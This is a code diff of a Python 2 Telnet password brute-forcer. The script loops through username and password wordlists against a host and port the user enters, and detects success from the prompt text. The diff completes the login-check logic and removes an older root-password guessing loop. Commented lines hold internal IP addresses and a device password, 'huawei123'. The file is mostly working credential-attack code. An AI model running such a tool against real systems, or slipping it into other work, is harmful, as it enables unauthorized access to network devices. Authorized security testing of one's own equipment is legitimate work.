@@ -8,51 +8,15 @@ import telnetlib, time, sys, os
 from _socket import gaierror, timeout
 
 '''
-def do_telnet(Host, Port, username, password, finish):  
-    #连接Telnet服务器  
-    tn = telnetlib.Telnet(Host, Port, timeout=1)  
-    tn.set_debuglevel(3)  
-      
-    #输入登录用户名  
-    tn.read_until("login: ")  
-    tn.write(str(username)+'\n')  
-      
-    # 输入登录密码  
-    tn.read_until("Password: ")  
-    tn.write(str(password)+'\n')  
-        
-    # 判断密码错误提示，如果没有这个提示说明登录成功  
-    if tn.read_until(finish):  
-        print "****** login incorrect!\n"  
-    tn.close();  
-      
-if __name__=='__main__':  
-    
-    Host = raw_input("IP:")           # Telnet服务器IP  
-    Port = raw_input("Port:")        # Telnet服务器端口  
-    username = 'root'          # 登录用户名  
-    finish = 'incorrect'       # 密码错误提示  
-    pw_file = open('.\\pw.txt','r+') #密码文件  
-    Index = 0  
-    print time.asctime(),":   ****** begin","\n"  
-    while True:  
-        password = pw_file.readline()  
-        Index +=1;  
-        print Index,time.asctime(),":   ****** try","",username,":",password,""  
-        if len(password) == 0:  
-            break;  
-        do_telnet(Host, Port, username, password, finish)  
-    pw_file.close();  
-    
-    raw_input('End')
-'''
-'''
 def xChange_ByPath(inPath_local = inputPath, outPath_local = OUTPUT_PATH, type = xChangeCore.XCHANGETYPE_MEM_ZERO):
     
     for tempX in os.listdir(inPath_local):
         tempDir_or_File = os.path.join(inPath_local, tempX)
         
 '''
+
+curTimeout = 0.5
+
 def openUserFile(filePath):
     '''
     Need close fileObj
@@ -74,9 +38,43 @@ def get_FileHandle(filePath):
         return None
     
 def do_checkPassword(tn):
-    pass
+    global curTimeout
+    
+    if tn:
+        if isinstance(tn, telnetlib.Telnet):
+            tnTuple_temp = tn.expect(['Authentication failed', '>'], curTimeout)
+            if tnTuple_temp[0] == 0:
+                print 'Authentication failed.' 
+                return False
+            elif tnTuple_temp[0] == 1:
+                print 'Authentication successed'
+                return True
+            else:
+                print 'Authentication wrong......'
+                print tnTuple_temp
+                return False
+            '''
+            tStr = tn.read_until('Authentication failed', curTimeout)
+            if len(tStr):
+                print tStr
+                print 'Debug: -------Authentication failed'
+                return False
+            
+            tStr = tn.read_until('>', curTimeout)
+            if len(tStr):
+                print tStr
+                print 'Debug: -------Authentication Success'
+                return True 
+            '''    
+        else:
+            raise ValueError('tn is not instance of Telnet.')
+    else:
+        raise ValueError('tn is none!')
 
-
+def show_result(result):
+    print '\n\n\nResult:'
+    print result
+    
 if __name__ == '__main__':
 
     isPasswd = True
@@ -87,7 +85,10 @@ if __name__ == '__main__':
     
     userHost = raw_input('IP: ')
     userPort = raw_input('Port: ')
-    
+    '''
+    userHost = '10.136.124.131'
+    userPort = '23'
+    '''
     username = ''
     password = ''
     
@@ -97,16 +98,16 @@ if __name__ == '__main__':
         tn = None
         
         while True:
-            tn = telnetlib.Telnet(userHost, userPort, timeout = 0.5)
-            tnResult = tn.read_until('Username:', 1)
-            if len(tnResult):
-                isUsername = True
-            else:
-                isUsername = False
-                
-            if isUsername:
+            tn = telnetlib.Telnet(userHost, userPort, timeout = curTimeout)
+            
+            tnTuple = tn.expect(['Username:', 'Password:', '<'], curTimeout)
+            print 'Debug: tuple1 ', tnTuple
+            if tnTuple[0] == -1:
+                raise ValueError('Expect Keyword Error. Step login one....')
+            elif tnTuple[0] == 0:
                 if isUsernameUpdate:
-                    username = fileUsername.readline()
+                    username = fileUsername.readline().strip()
+                    print 'Debug: get username: ', username
                     isUsernameUpdate = False
                     isPasswordRefresh = True
                 
@@ -114,42 +115,47 @@ if __name__ == '__main__':
                     tn.write(str(username) + '\n')
                 else:
                     tn.close()
-                    print 'There is no password'
+                    print 'There is no username to try.'
                     break
-   
-            tnResult = tn.read_until('Password:', 1)
-            if len(tnResult):
-                isPasswd = True
-            else:
-                isPasswd = False
                 
-            if isPasswd:
+                tnTuple_1 = tn.expect(['Password:'], curTimeout)
+                print 'Debug: tuple2 ', tnTuple_1
+                if tnTuple_1[0] == -1:
+                    raise ValueError('Expect Keyword Error. Step login two....')
+            
+            if tnTuple[0] == 2:
+                tn.close()
+                show_result('''    No password''')
+                break
+            
+            if tnTuple[0] == 1 or tnTuple_1[0] == 0:
                 if isPasswordRefresh:
                     filePassword.close()
                     filePassword = get_FileHandle(r'.\password.txt')
                     isPasswordRefresh = False
-                password = filePassword.readline()
+                password = filePassword.readline().strip()
+                print 'Debug: get password: ', password
                 
                 if len(password):
                     tn.write(str(password) + '\n')
+                    print 'do check password'
                     if do_checkPassword(tn):
                         isCorect = True
                 else:
                     isUsernameUpdate = True
+                    
+            
 
             tn.close()
 
-            if not (isPasswd or isUsername):
-                print 'There is no password'
-                break
-            
             if isCorect:
-                print '''
+                show_result('''
                 Username: %s
                 Passwod: %s
                 ''' % (username, password)
-                break;
-
+                )
+                break
+                
     except gaierror as e:
         print 'Error: ', e
         print 'Please check your IP address or port.'
@@ -172,38 +178,3 @@ if __name__ == '__main__':
             filePassword.close()
             
         raw_input('Press any key to close this window.')
-            
-
-    '''
-    tnStr = ''
-    tn1 = telnetlib.Telnet('fafa.124.300', port = 23, timeout = 0.5)
-    while True:
-        try:
-            tnStr += tn1.read_some()
-        except BaseException as e:
-            print tnStr
-            print e
-            break
-    tn1.close()
-    '''
-        
-    '''
-    try:
-        tn = telnetlib.Telnet('10.136.6.204', port = 23, timeout = 2)
-        if None == tn :
-            print 'tn = Null'
-        
-    except BaseException as e:
-        #print('BaseException: ' + e)
-        print 'BaseException: ', e
-    else:
-        tnResult = tn.read_until('Password:', 5)
-        print (tnResult)
-        #tnResult = tn.write('huawei123\n')
-        print tn.read_until('>', 5)
-        tn.close()
-    finally:
-        #print(tn)
-        #tn.close()
-        pass
-    '''
